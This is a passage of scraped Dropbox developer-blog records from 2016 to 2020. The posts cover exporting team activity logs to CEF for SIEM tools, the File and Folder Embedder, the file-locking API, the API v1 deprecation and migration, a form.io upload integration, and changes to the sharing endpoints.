\\\"10\\\",\r\n            \\\"category\\\":\\\"file_operations\\\"}\" Objective: Return all events for account id dbid:AACaXNrKenjisuUqxju9ppCK5B4J1rknytk from a specific date range Copy curl -X POST https://api.dropboxapi.com/2/team_log/get_events \\\r\n    --header \"Authorization: Bearer <auth_token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data \"{\\\"account_id\\\": \\\"dbid:AACaXNrKenjisuUqxju9ppCK5B4J1rknytk\\\",\r\n            \\\"time\\\":\r\n              {\\\"start_time\"\\: \\\"2019-09-12T00:00:00Z\"\\,\r\n              \\\"end_time\"\\: \\\"2019-12-12T00:00:00Z\"\\}\r\n            }\" The response of the team_log endpoints is made up of a list of entries under the event field, a cursor , and has_more flag. Each entry in the event field contains information such as the event_type , actor , origin , or assets involved. An important note is that each event entry will always have the timestamp , event_category , event_type , and details fields available. However, depending on the type of event, information like origin and assets may not be available. If the has_more flag is true you’ll also be returned a cursor used to paginate through additional events that weren’t displayed in the initial call. The cursor is passed to the team_log/get_events/continue to return the next page of activity. The cursor is a string that can be saved and used to poll for new events. However, cursors do expire (usually valid for a few days) and should be updated with every call to the team_log endpoints. Be prepared to handle reset exceptions if the cursor expires. You’ll want to store the cursor somewhere when you’re paginating through events, and when you want to poll for new events based on the original event query. Common Event Format (CEF) details We’ll cover a simplified overview of the CEF here, but please refer to Micro Focus ArcSight’s official documentation for more detailed descriptions of the format and guidelines. At a high-level the CEF format defines a syntax for standardizing logs from multiple sources. The format is broken up into two distinct parts: headers which define important metadata and the extension, which is a collection of key value pairs. Each individual header is separated by a pipe operation, “|”,  with the final section containing the extension. Once compiled, events are sent to a designated server via syslog, a protocol used to send logs to a central storage place. You can read more about the syslog protocol here . The full CEF event sent to a syslog server would look similar to the to the one below: CEF:Version|Device Vendor|Device Product|Device Version|Device Event Class ID|Name|Severity|[Extension] The most important headers to consider are Device Event Class ID, Name and Severity.  These headers are variable and provide information on the particular event. The remaining headers are static values that detail information about ArcSight and Dropbox. Device Event Class ID : This maps to unique identifiers per event-type. Name : A human readable description of the event that occurred. Severity : A string or integer reflecting the importance of the event. For our use we’ll be using the integer representation. CEF defines the integer severity range as: 0-3 = Low, 4-6 = Medium, 7-8 = High, and 9-10 = Very-High The extensions at the end of the header are specific keys that ArcSight has defined that map to certain data types. For example, the key src maps directly to IPv4 addresses. This would be represented as src=10.0.0.1 . Multiple extensions are separated by spaces, and any event can have any number of key-value pairs in any order . Let’s pull all of this together into a sample Dropbox team event in the CEF format: CEF:0|Dropbox|Dropbox Audit Log|1|logout|Signed out|6|duser=example@dropbox.com duid=dbmid:AAACCXX cat=logins rt=Feb 24 2016 22:45:43 end=Feb 24 2016 22:45:43 src=10.10.0.111 As you can see the first three headers detail the CEF version and information about Dropbox. Device Vendor and Device Product would be different based on the specific logging device. Mapping the activity log to CEF Now that we’ve covered how to work with the Dropbox activity log and the common event format, let’s take a look at a mapping of event details from Dropbox to CEF key names. CEF Full Name (Key Name) DropBox Audit Log Mapping / Value Info Device Vendor Dropbox Device Product Dropbox Activity Log Device Version 1 CEF Version 0 Event Class ID Event Type “.tag” field Name Event Type “description” field Severity See severity mapping below destinationUserName (duser) Event Actor Email destinationUserID (duid) Event Actor Team Member ID deviceEventCategory (cat) Event Category receiptTime (rt) Event Timestamp end Event Timestamp deviceCustomString1 (cs1) Event Details JSON deviceCustomString1Label (cs1Label) Custom label for field above string field deviceCustomString2 (cs2) Event Actor JSON deviceCustomString3Label (cs2Label) Custom label for field above string field deviceCustomString3 (cs3) Event Origin JSON deviceCustomString3Label(cs3Label) Custom label for field above string field sourceAddress (src) IP address of actor deviceCustomString4 (cs4) Event Assets details deviceCustomString4Label (cs4Label) Custom label for field above string field Not all information for an event is mapped to CEF key names, as the activity log provides details that do not readily map back to CEF. These CEF key names are sourced from MicroFocus’ documentation . As we mentioned earlier, Severity is an important header that is assigned to an event. Based on the perceived impact a specific event has on a team, we assign each event a severity according to what category the event falls under. These severity ranks were determined based on the impact they might have on a team. For example, someone commenting on a document may be low impact and severity, but changing two-factor authentication settings or team policies would have a high security impact and severity. These mappings can be changed to match the definitions of severity unique to every organization. Category Severity Rank Comments 0 Paper 1 Showcase 1 File Requests 2 File Operations 3 Devices 4 Sharing 4 Apps 5 Groups 5 Team Profile 5 Domains 6 Logins 6 Members 6 Team Folders 6 Passwords 7 Reports 7 SSO 7 Trusted Teams 7 Team Policies 9 TFA (Two Factor Authentication) 9 Python script to convert the activity log to CEF Let’s combine our new knowledge to create a script that will pull events from the activity log, convert it into the CEF format and send those events to a designated syslog server when you pass in a host and a port. Note: The script is compatible with Python versions 3.0+. You’ll also need a Dropbox Business access token with either the “Team Auditing” or “Team Member File Access” permissions. At the most basic level all you need to run the script is your access token, but you can adjust the events pulled with optional arguments that correspond to the activity log endpoint parameters. You can access the files for the script here . To get started from the provided files open up the “parserSettings.ini” and paste your Dropbox Business access token next to dfbToken= . Since we are hardcoding an access token here, if you are using version control be mindful about storing this value, especially if using a public repository. In those situations, or in a production environment, consider using the dotenv library along with a .gitignore file to create local environment variables. Additionally if you need to adjust and read in settings the “parserSettings.ini” file can be a good place to set this, for example with the severity mapping. Below are a few examples that use optional arguments with the provided “cefParser.py” script. Remember to execute the samples from the same directory the script is located in. Objective : Generate a CSV of CEF events for all single sign on events : python cefParser .py --output --category sso In this example passing in the argument --output will generate a .CSV file of the events pulled. --category or -c designates you want to filter on an event category and sso (single sign on) is the category filter. Objective : Send all category of events to designated syslog server python cefParser.py --host 121.121.01.10 --port 1234 Here you’re sending all events to the host and port you’ve designated, by using the --host and --port arguments. Objective : Send all CEF events from 2018 up to 2019 to designated syslog server python cefParser.py --host 121.121.01.10 --port 1234 --start_time 2018-01-01T00:00:00Z --end_time 2019-01-01T00:00:00Z Using the --start_time and --end_time arguments you can filter events from a certain time period. To see how to use the full list of arguments and the details of each you can run python cefParser.py --help . When running the script it will show updates in terminal when it is pulling events, writing them to a CSV or sending them to the syslog server. As part of the final output the script will return the event cursor that can be used for any subsequent calls or polling. Here’s an example of a raw event you would get from the Dropbox event log: Copy {\r\n   \"timestamp\":\"2016-12-09T17:51:38Z\",\r\n   \"event_category\":{\r\n      \".tag\":\"file_operations\"\r\n   },\r\n   \"actor\":{\r\n      \".tag\":\"user\",\r\n      \"user\":{\r\n         \".tag\":\"team_member\",\r\n         \"account_id\":\"dbid:AAXCPeiWpyqDu7DFMevhIJXQGLGGAXOZ8EvU\",\r\n         \"display_name\":\"Tahsin Islam\",\r\n         \"email\":\"ti@dbxexamples.com\",\r\n         \"team_member_id\":\"dbmid:AADOKK2wbsDF52k9LWixze38RY1tNFSRvCI\"\r\n      }\r\n   },\r\n   \"origin\":{\r\n      \"geo_location\":{\r\n         \"city\":\"Unknown\",\r\n         \"region\":\"Unknown\",\r\n         \"country\":\"Unknown\",\r\n         \"ip_address\":\"172.31.101.80\"\r\n      },\r\n      \"access_method\":{\r\n         \".tag\":\"end_user\",\r\n         \"end_user\":{\r\n            \".tag\":\"web\",\r\n            \"session_id\":\"dbwsid:1\"\r\n         }\r\n      }\r\n   },\r\n   \"involve_non_team_member\":False,\r\n   \"context\":{\r\n      \".tag\":\"team_member\",\r\n      \"account_id\":\"dbid:AAXCPeiWpyqDu7DFMevhIJXQGLGGAXOZ8EvU\",\r\n      \"display_name\":\"Tahsin Islam\",\r\n      \"email\":\"ti@dbxexamples.com\",\r\n      \"team_member_id\":\"dbmid:AADOKK2wbsDF52k9LWixze38RY1tNFSRvCI\"\r\n   },\r\n   \"assets\":[\r\n      {\r\n         \".tag\":\"folder\",\r\n         \"path\":{\r\n            \"contextual\":\"/Share145\",\r\n            \"namespace_relative\":{\r\n               \"ns_id\":\"3159137245\"\r\n            }\r\n         },\r\n         \"file_id\":\"id:jDYRsZKZImAAAAAAAAAAZg\"\r\n      }\r\n   ],\r\n   \"event_type\":{\r\n      \".tag\":\"file_add\",\r\n      \"description\":\"Added files and/or folders\"\r\n   },\r\n   \"details\":{\r\n      \".tag\":\"file_add_details\"\r\n   }\r\n} Here’s what that same event looks like after being converted into CEF: CEF:0|Dropbox|Dropbox Activity Log|1|file_add|Added files and/or folders|3|duser=ti@dbxexamples.com duid=dbmid:AADOKK2wbsDF52k9LWixze38RY1tNFSRvCI cat=file_operations rt=Dec 09 2016 17:51:38 end=Dec 09 2016 17:51:38 cs1={'.tag': 'file_add_details'}, cs1Label=Details of event cs2={'.tag': 'user', 'user': {'.tag': 'team_member', 'account_id': 'dbid:AAXCPeiWpyqDu7DFMevhIJXQGLGGAXOZ8EvU', 'display_name': 'Tahsin Islam', 'email': 'ti@dbxexamples.com', 'team_member_id': 'dbmid:AADOKK2wbsDF52k9LWixze38RY1tNFSRvCI'}} cs2Label=Details of event actor cs3={'geo_location': {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'ip_address': '172.21.101.82'}, 'access_method': {'.tag': 'end_user', 'end_user': {'.tag': 'web', 'session_id': 'dbwsid:1'}}} cs3Label=Details of the event origin src=172.21.101.82 cs4=[{'.tag': 'folder', 'path': {'contextual': '/Share145', 'namespace_relative': {'ns_id': '3159137245'}}, 'file_id': 'id:jDYRsZKZImAAAAAAAAAAZg'}] cs4Label=Details of event assets Dropbox activity log in CEF format The Dropbox activity log is a robust, powerful tool that exposes information about events that occur in Dropbox. By converting those events into the CEF standard, the information becomes easier for SIEM applications to work with. This article included links to a repo with a sample script to convert events from the Dropbox activity log into the CEF standard. If you want to learn more about the CEF standard format you can explore the documentation here . For more Dropbox tutorials and technical guides, check out our previous blog posts or our reference page . If you need technical support for the Dropbox API, then you can use the support request form , post on our developer forum , or @ us on Twitter . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Python Sample Apps Tips and Tricks Business Endpoints Team Log // Copy link Link copied Link copied", "date": "2020-04-10"},
{"website": "Dropbox", "title": "New File and Folder Embedder Launched in Preview", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/new-file-and-folder-embedder-launched-in-preview", "abstract": "Introducing the File and Folder Embedder Embedding a File Embedding a Folder Feedback and Feature Requests [The Embedder is no longer in the Preview phase. Please refer to the Embedder documentation for the most up-to-date information.] Wouldn’t it be convenient if your users could see their Dropbox content without leaving your app? You could build that functionality yourself using the Dropbox API, but why not use our new File and Folder Embedder and let us do the heavy lifting? It’s a good time to be a Dropbox developer. In 2020, we’ll be releasing some new pre-built components to give your users new and interesting ways of interacting with their Dropbox content on your surface. If you leave us feedback while a component is in the Preview phase, then we’ll use it to help plan enhancements to the component. In case you’re new to Dropbox’s embeddable components, they’re concise snippets of code that can be copied into your HTML. The components allow your users to access, organize, and manage their Dropbox files without having to leave your website or app. Up until now, Dropbox has offered two components: Chooser , which allows users to get files from a Dropbox account and Saver , which lets users save files into a Dropbox account. Introducing the File and Folder Embedder Adding robust Dropbox functionality to your app just got even easier. We’re excited to release a “Preview” version of the File and Folder Embedder , a new, pre-built component that allows your users to view and interact with their Dropbox files or folders from within your app. The File and Folder Embedder uses a shared link and either an anchor tag ( <a> ) or JavaScript method ( Dropbox.embed() ) to generate an interactive content embed inside an <iframe> . The component works with files or folders and has different features available for each type of content. New documentation for building with the Embedder is available here: https://www.dropbox.com/developers/embedder. You or your users can get a Dropbox shared link to your content in a number of ways, including but not limited to: The Dropbox API Dropbox Chooser , another pre-built component similar to File and Folder Embedder Tip: Chooser can be configured to select only specific file types The Dropbox user interface like the web site , desktop app, or mobile apps The content displayed by the Embedder depends on the shared link. If the shared link points to a folder, then the embed lists the content of the folder. However, if the shared link points to a file, then the embed is a preview of that file. Embedding a File At the time of release, the Embedder can generate view-only previews for the following types of files : Multi-page docs (.pdf, .pptx, .docx, .ai) Images (.jpg, .gif, .png, .psd) A user can interact with the embedded files in the following ways: View a file’s activity feed Open the file on Dropbox Here’s an example of what an embedded PDF file looks like: Screenshot of embedded file We used the Embedder to generate the preview above with the following code: Copy <a \r\n  href=\"https://www.dropbox.com/sh/keptcjl08q3wsid/AABfOq8QCJY-fg2RgpwdsrGLa/Getting_Started_with_Dropbox_Paper.pdf?dl=0\"\r\n  class=\"dropbox-embed\"\r\n  data-height=\"500px\"\r\n></a> You could also use the Dropbox.embed() method (especially helpful if you’re embedding the content dynamically): Copy Dropbox.embed({link:\"https://www.dropbox.com/sh/keptcjl08q3wsid/AABfOq8QCJY-fg2RgpwdsrGLa/Getting_Started_with_Dropbox_Paper.pdf?dl=0\"}, embedContainer) You can learn to embed files by using the Embedder documentation . Embedding a Folder At the time of release, the Embedder can generate a preview of a folder that displays the folder’s contents. Users can interact with folders by: Toggling between grid and list view Opening files in Dropbox Copying shared links to the folder or individual files Here’s an example of what an embedded folder looks like: Screenshot of embedded folder We used the Embedder’s JavaScript method to create the folder embed dynamically: Copy Dropbox.embed({link:\"https://www.dropbox.com/sh/keptcjl08q3wsid/AACui966iXcXPbagCJ2py2L-a?dl=0\"}, embedContainer) You can also use an anchor tag () to embed the folder: Copy <a \r\n  href=\"https://www.dropbox.com/sh/keptcjl08q3wsid/AACui966iXcXPbagCJ2py2L-a?dl=0\"\r\n  class=\"dropbox-embed\"\r\n></a> You can learn to embed folders by using the Embedder documentation. Feedback and Feature Requests Can you help us improve the Embedder? We're actively working to enhance the capabilities and supported file types to make the component more valuable for your users. You can leave your feedback on this post in our developer forum . Don’t hesitate to reach out to us if you need help! You can use the support request form , post on our developer forum , or @ us on Twitter . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements Sharing Components New Feature // Copy link Link copied Link copied", "date": "2020-03-30"},
{"website": "Dropbox", "title": "File locking using the Dropbox API", "author": ["Sara Wiltberger and Stanimir Pehlivanov"], "link": "https://dropbox.tech/developers/file-locking-using-the-dropbox-api", "abstract": "File locking in Dropbox File locking with the User API Administering file locks with the Business API Building file locking into your Dropbox App There are an amazing variety of projects with vast bodies of work that are distilled down into a single file. Things like a podcast with guests from all over the world, a comprehensive blueprint for a downtown skyscraper, or a feature film made by a movie studio all have a central file that ties everything together. There can be quite a broad range of users that need to collaborate with others on the same file. But how can you ensure that important files stay up to date and serve as the single source of truth? Enter file locking *. Let’s explore what value file locking can add to your Dropbox app. * Note that file locking features are only available for Dropbox Business users. File locking in Dropbox File locking provides a way for collaborative users to prevent any unwanted edits to particular files. The feature “locks” the file in place so it doesn’t get moved, deleted, changed, or updated by another person or application. File locking is designed to work with apps that use a file check in/check out flow. Only the file locker will have the ability to edit and unlock the file (although team admins can override the lock). Only files in shared folders can be locked. Key behaviors of the file locking feature: Prevent modifications to locked file Locked file can be viewed and downloaded Users can see whom holds the file lock Admins can override locks by their team As a quick prerequisite, let’s create a shared file structure. Create a shared folder named “file-lock-article” in your root directory and place a text file named “test-doc.txt” inside. The final path should be “/file-lock-article/test-doc.txt”. Create a second doc in the same directory — “/file-lock-article/another-doc.txt”. File locking with the User API We’ll be using two new file locking endpoints: /files/lock_file_batch /files/unlock_file_batch We recommend having Dropbox open in the browser so you can manually lock or unlock files as needed when working with the sample scripts. Seeing the file locking feature in the Dropbox user interface may also help understand API behavior. Create a user access token Create a new Dropbox app from your app console Select ‘Dropbox API’Select ‘Full Dropbox’ Provide name and click ‘Create app’From the Settings page, select the button to generate access token Save access token to be used in following examples Locking files as a user The /files/lock_file_batch endpoint accepts a list called entries with each entry referencing a specific file with the path parameter, which can be a file path or a file id . Go ahead and lock the test-doc.txt and another-doc.txt files we created earlier: Copy curl -X POST \\\r\n  https://api.dropboxapi.com/2/files/lock_file_batch \\\r\n  -H 'Authorization: Bearer <user_access_token>' \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\r\n        \"entries\": [\r\n                {\r\n                        \"path\": \"/file-lock-article/test-doc.txt\"\r\n                },\r\n                {\r\n                        \"path\": \"id:7AObMBEU53AAAAAAAAAASw\"\r\n                },\r\n                {\r\n                        \"path\": \"/throw-an-error\"\r\n                }\r\n        ]\r\n}' The response includes the result for each entry submitted: Copy {\r\n    \"entries\": [\r\n        {\r\n            \".tag\": \"success\",\r\n            \"metadata\": // file metadata,\r\n            \"lock\": // file lock info\r\n        },\r\n        {\r\n            \".tag\": \"success\",\r\n            \"metadata\": // file metadata,\r\n            \"lock\": // file lock info\r\n        },\r\n        {\r\n            \".tag\": \"failure\",\r\n            \"failure\": // error message\r\n        }\r\n    ]\r\n} Getting file lock info as a user If a file is locked, then the file’s metadata will return an additional property, file_lock_info , that contains information about the lock. Endpoints that return file metadata such as /files/get_metadata or /files/list_folder will also return file_lock_info for files that are locked. Use a /files/list_folder call to look at the file lock information for the two files we just locked: Copy curl -X POST \\\r\n  https://api.dropboxapi.com/2/files/list_folder \\\r\n  -H 'Authorization: Bearer <user_access_token>' \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\r\n        \"path\": \"/file-lock-article\"\r\n}' Your locked .txt files will contain file lock information: Copy \"file_lock_info\": {\r\n    \"is_lockholder\": false,\r\n    \"lockholder_name\": \"Taylor K\",\r\n    \"lockholder_account_id\": \"dbid:AAB9bIvxKmEflS5houxLa198BIEaS_iYZI\",\r\n    \"created\": \"2019-12-19T18:03:37Z\",\r\n    \"is_locked\": true\r\n} Unlocking files as a user The /files/unlock_file_batch will unlock files at a specified path or file id. Locked files can only be unlocked by the lock holder (or a team admin if you’re using a Business account). Unlock the files from our example: Copy curl -X POST \\\r\n  https://api.dropboxapi.com/2/files/unlock_file_batch \\\r\n  -H 'Authorization: Bearer <user_access_token>' \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\r\n        \"entries\": [\r\n                {\r\n                        \"path\": \"/file-lock-article/test-doc.txt\"\r\n                },\r\n                {\r\n                        \"path\": \"id:7AObMBUU53AAAAAAAAAARA\"\r\n                }\r\n        ]\r\n}' You’ll see a success message upon file unlock. Administering file locks with the Business API In this section you’ll need to use a team member file access token for and the Dropbox-API-Select-Admin header. If the concept of a team-linked Dropbox app is new to you (or you need a refresher), then this article may be helpful: Manage team sharing in your Dropbox App . Imagine you’re building a security app that scans a team’s Dropbox files for policy compliance and moves them to a quarantine zone if a problem is found. As your app parses the folder hierarchy, locked and unlocked files alike can be downloaded and scanned. However, once a problem file is identified, locked files have to be unlocked before they can be moved to quarantine. Make sure that the test-doc.txt file we created earlier is locked and located inside a shared folder nested in your team member folder. This will be the “non-compliant file” for our example. Discovering file locks As your security app parses your team’s files and makes /files/list_folder or /files/get_metadata calls, it examines the metadata for each file. Only locked files will include a file_lock_info property with important information about the file lock. Let's check our test-doc.txt file: Copy curl -X POST \\\r\n  https://api.dropboxapi.com/2/files/get_metadata \\\r\n  -H 'Authorization: Bearer <team_file_access_token>' \\\r\n  -H 'Content-Type: application/json' \\\r\n  -H 'Dropbox-API-Select-Admin: dbmid:AAAIrHhxSNGhQ0QD4hZ85lYRDSEhQdovJTg' \\\r\n  -d '{\r\n        \"path\": \"/file-lock-article/test-doc.txt\"\r\n}' Yikes! Pretend your security app discovered a file ( test-doc.txt ) that doesn’t comply with company policy. The file’s lock must be removed before the file can be moved to quarantine. Administer a file unlock as an admin In Dropbox, a team’s admin is able to unlock files from the Admin Console. Similarly, a call to the /files/unlock_file_batch endpoint with the Dropbox-API-Select-Admin header set to an admin’s team_member_id unlocks the file as a team admin. Unlock a file as an admin: Copy curl -X POST \\\r\n  https://api.dropboxapi.com/2/files/unlock_file_batch \\\r\n  -H 'Authorization: Bearer <team_file_access_token>' \\\r\n  -H 'Content-Type: application/json' \\\r\n  -H 'Dropbox-API-Select-Admin: dbid:AADuXdtqA88UpveXxu7rcTSo64ADcrWnBMk' \\\r\n  -d '{\r\n        \"entries\": [\r\n                {\r\n                        \"path\": \"/file-lock-article/test-doc.txt\"\r\n                }\r\n        ]\r\n}' Now the locked file is unlocked and can be moved to the quarantine folder (or otherwise handled how you defined in your app). Hooray! File locks in team-linked apps Some key takeaways for building file locking into your team apps: When building file locking into team-linked Dropbox apps, you’ll need to use a team file access token and either the Dropbox-API-Select-User or Dropbox-API-Select-Admin header. The most straightforward way to determine whether a file is locked is checking whether a file’s metadata includes a file_lock_info property. File locking endpoints will accept file paths and file ids. Building file locking into your Dropbox App For some applications, the introduction of file locking exposes powerful new use cases and workflows. For other classes of apps, file locking means they’ll need to add some additional logic for interacting with locked files (like our security app example). This article covered the behavior of file locking at a high level and how to build file locking into your app with both the Dropbox User API and the Dropbox Business API . If you have any questions about file locking or need help building with the Dropbox API, you can contact us here or post on our developer forum . Build with Dropbox today at www.dropbox.com/developers // Sara Wiltberger and Stanimir Pehlivanov guest authors // Tags Developers New Feature Shared Folders Files // Copy link Link copied Link copied", "date": "2020-03-11"},
{"website": "Dropbox", "title": "API v1 is now deprecated", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/api-v1-deprecated", "abstract": "What does this mean for you as a Dropbox API developer? Timeline Edit 06/23/2017: Deprecation timeline updated to match the one described in our recent blog post . As of today, Dropbox API v1 is deprecated. This includes both the user endpoints (a.k.a. the Core API), and the team endpoints (a.k.a. the Business API). In order to provide our developers with the most up-to-date features and support a single, consistent platform, we’ll be turning off API v1 a year from now, on 6/28/2017. API v2 is built thoughtfully with a consistent design and adds new endpoints and features. Additionally, we've open-sourced our SDK generator, Stone , which revolutionizes how our SDKs are made. Stone also creates an open ecosystem for building and improving our SDKs. Check it out, and see how you can generate Dropbox SDKs for any language you want. What does this mean for you as a Dropbox API developer? First, you’ll want to build all new apps on API v2. Second, you will need to update all of your existing apps to use API v2 as soon as possible. We will be shutting down API v1 in June 2017, so you have a year to transition your app to API v2. Check out our API v1 to v2 migration guide for more details on how to migrate your app. Finally, you should confirm that you’re aware of the deprecation plan by clicking the button at the top of the screen on the developers site . Beginning September 28, 2016, new users of apps that haven’t acknowledged will see a warning when linking the app for the first time. Beginning March 28, 2017, all users of apps that haven’t acknowledged will be receive warning emails about the upcoming functionality. If you do not want your users to receive direct communication from us, make sure you acknowledge the deprecation on the developers site as soon as possible. Timeline June 28, 2016 : API v1 is deprecated. September 28, 2016 : If you haven't acknowledged the deprecation, new users of your app will see a warning when linking their Dropbox account. June 28, 2017 : If you haven't acknowledged the deprecation, all users who have linked their Dropbox account to your app will receive a warning email. September 28, 2017 : API v1 endpoints are turned off. Thanks for your patience and understanding in the transition to our new API v2. We’re continually working to improve your experience developing for the Dropbox Platform. Questions? Feedback? Feel free to reach out on our developer forum . // Tags Developers Announcements Deprecation // Copy link Link copied Link copied", "date": "2016-06-28"},
{"website": "Dropbox", "title": "Announcing the v1 to v2 migration guide", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/announcing-the-v1-to-v2-migration-guide", "abstract": "Open issues UPDATE JUNE 29, 2016 This post now has been updated to include new information about open issues. Developers, it’s time to start migrating your apps to API v2. To help with this transition, today we’ve published a migration guide that will take you through all of the changes you’ll need to make to get your app running on API v2. While you’re transitioning your app off of v1, you can also check out the new features available in v2 . There’s support for enhanced sharing, searching, and more. Remember, any new functionality in the Dropbox API will only be added to API v2. So, upgrade your apps to v2 now, and make sure your users are getting the most out of your app’s Dropbox integration. Migration guide Starting today, you can find the migration guide in the “References” section of the Dropbox Platform homepage . The goal of this guide is to give developers all the necessary information to start migrating API v1 apps to use API v2. It includes a mapping of v1 functionality to the v2 equivalents, syntax changes, as well as new platform features that you’ll need to be aware of. We’re open to feedback; if you see something that’s confusing, unexpected, or missing, please leave a comment on this blog post, or post a question on the forum . Open issues As you can see from the guide, most apps can fully migrate to v2 today. However, for apps with functionality that is not yet supported in v2, developers can still start working on the migration now (see section on hybrid mode ). Rest assured that, before we retire v1, we’ll make sure that there is a documented migration flow for the remaining issues. Here are the open migration issues that we’re planning to add to the migration guide before we retire API v1: Supported functionality or equivalent workarounds for /team/log/get_events. Objective-C SDK: Coming August 2016 Other SDKs (PHP, Ruby, etc): See our community SDK page , and learn how to make an SDK in the language of your choosing with Stone . // Tags Developers Guide Announcements // Copy link Link copied Link copied", "date": "2016-04-11"},
{"website": "Dropbox", "title": "How <form.io> uses Dropbox as a file backend for JavaScript apps", "author": ["Randall Knutson"], "link": "https://dropbox.tech/developers/how-formio-uses-dropbox-as-a-file-backend-for-javascript-apps", "abstract": "Uploading a file to Dropbox Accessing the file within a web app Randall Knutson is the Lead Architect at <form.io> , a combined form and API data management platform designed specifically for application developers, addressing complex enterprise workflow applications that require highly-customized roles and permissions, offline mode, integration into multiple 3rd-party and legacy systems, and data analysis and reporting. <form.io> can be deployed as a cloud‐based or on‐site solution, allowing developers to maintain control of their data and back‐end logic. <form.io> makes it easy to create complex form-based AngularJS and React applications. Many of these apps require file upload and download capability embedded directly within the application. We knew right away that Dropbox was the solution we wanted to to integrate into the <form.io> platform. Dropbox provides SDKs to integrate with their new API v2 in a variety of languages. However, since the JavaScript SDK is still under development, we wrote our own integration using the HTTP endpoints directly. Uploading a file to Dropbox First, we added code to fetch an OAuth 2 access token for using in the Dropbox API calls. You can see the Dropbox OAuth guide for more info about using OAuth with Dropbox. Note: client-side apps should be careful to only expose the access token to the owner of the token, not others. Next, we created a file selector field and an onchange event that will upload the file. Copy <form>\r\n  <input type=\"file\" name=\"file\" accept=\"image/*\" onchange=\"uploadFile\">\r\n</form> Initially we attempted to use both an Angular file upload service and $http directly. However, we found that these send as multipart/form-data which is not what the Dropbox API expects. Instead, the Dropbox API expects the data to be send directly with a type of application/octet-stream . To make this happen we used XMLHttpRequest directly: Copy /**\r\n * Two variables should already be set.\r\n * dropboxToken = OAuth access token, specific to the user.\r\n * file = file object selected in the file widget.\r\n */\r\n  \r\nvar xhr = new XMLHttpRequest();\r\n \r\nxhr.upload.onprogress = function(evt) {\r\n  var percentComplete = parseInt(100.0 * evt.loaded / evt.total);\r\n  // Upload in progress. Do something here with the percent complete.\r\n};\r\n \r\nxhr.onload = function() {\r\n  if (xhr.status === 200) {\r\n    var fileInfo = JSON.parse(xhr.response);\r\n    // Upload succeeded. Do something here with the file info.\r\n  }\r\n  else {\r\n    var errorMessage = xhr.response || 'Unable to upload file';\r\n    // Upload failed. Do something here with the error.\r\n  }\r\n};\r\n \r\nxhr.open('POST', 'https://content.dropboxapi.com/2/files/upload');\r\nxhr.setRequestHeader('Authorization', 'Bearer ' + dropboxToken);\r\nxhr.setRequestHeader('Content-Type', 'application/octet-stream');\r\nxhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({\r\n  path: '/' +  file.name,\r\n  mode: 'add',\r\n  autorename: true,\r\n  mute: false\r\n}));\r\n \r\nxhr.send(file); Now when a user selects a file with the file field it will directly uploaded to Dropbox and a reference to the file can be saved on the server. Accessing the file within a web app The file is now stored in Dropbox and a link to the file can be displayed to the users to access the file. However, files stored in Dropbox are not directly accessible like normal web files. Instead, we need to intercept click events on the file link and handle the Dropbox authentication to the file. Since we are getting the contents of the file directly from Dropbox we needed to intercept the click event, download the contents of the file using the Dropbox API /download endpoint, and save the contents to the user’s computer. We can do this using the new HTML5 Blob constructor and FileSaver , which are now supported on modern browsers. Here is our click event in Angular: Copy downloadFile: function(evt, file) {\r\n  evt.preventDefault();\r\n  var xhr = new XMLHttpRequest();\r\n  xhr.responseType = 'arraybuffer';\r\n \r\n  xhr.onload = function() {\r\n    if (xhr.status === 200) {\r\n      var blob = new Blob([xhr.response], {type: ’application/octet-stream’});\r\n      FileSaver.saveAs(blob, file.name, true);\r\n    }\r\n    else {\r\n      var errorMessage = xhr.response || 'Unable to download file';\r\n      // Upload failed. Do something here with the error.\r\n    }\r\n  };\r\n \r\n  xhr.open('POST', 'https://content.dropboxapi.com/2/files/download');\r\n  xhr.setRequestHeader('Authorization', 'Bearer ' + dropboxToken);\r\n  xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({\r\n    path: file.path_lower\r\n  }));\r\n  xhr.send();\r\n} With this function we are able to intercept the file click event, authenticate the user with Dropbox, download the contents of the file, and initiate a file save event in the browser. You can see our full implementation in our open source library on GitHub . Using the Dropbox API, <form.io> was able to create a file uploader and a file viewer by accessing the HTTP endpoints directly. Now anyone building a web app on our platform can easily integrate Dropbox as their backend without having to do the hard work themselves. Feel free to reach out to us at <form.io> if you have any questions or create an account and check out how we implemented the Dropbox API. // Tags Developers Tips and Tricks JavaScript Developer Spotlight // Copy link Link copied Link copied", "date": "2016-03-15"},
{"website": "Dropbox", "title": "Breaking changes to beta sharing endpoints", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/breaking-changes-sharing-beta", "abstract": "Breaking change to /list_folders Breaking changes to /get_folder_metadata [UPDATE December 11, 2015] The following breaking changes are now available in the SDKs. We’re making some improvements to the sharing features currently in beta. Specifically, we’re introducing paging support, and a new shared folder membership endpoint. We’ve also made some changes to how member errors are reported, as well as some of the fields included in SharedFolderMetadata. These changes will not be backwards compatible, but will allow for better scalability and ease of use. These updates are in our HTTP API, and our SDKs: Swift , Python , .NET , and Java . New: List folders paging Clients will no longer need to worry about slow response times and heavy responses for large sets of shared folders or shared folder members. These endpoints now support paging: sharing/list_folders sharing/list_folder_members When querying the endpoints, responses will contain an optional cursor field that, when present, indicates there are more results to fetch from the server. Remaining results are available in the corresponding /continue endpoints. These endpoints accept a cursor, and return the next batch of results: sharing/list_folders/continue sharing/list_folder_members/continue Breaking change to /list_folders It is important that callers of sharing/list_folders update their logic to properly handle the optional cursor in listing responses, otherwise clients may only be processing partial results. Copy struct ListFoldersResult\r\n    entries List(SharedFolderMetadata)\r\n    cursor String? New: Membership endpoint In order to properly support paging across shared folder members, membership will be available through two new endpoints that support paging: sharing/list_folder_members sharing/list_folder_members/continue Additionally, the members field in our shared folder membership responses will be renamed to users to be more consistent with the naming of other fields: Copy {\r\n    \"users\": [\r\n        {\r\n            \"access_type\": {\r\n                \".tag\": \"owner\"\r\n            }, \r\n            \"user\": {\r\n                \"account_id\": \"dbid:AAH4f99T0taONIb-OurWxbNQ6ywGRopQngc\", 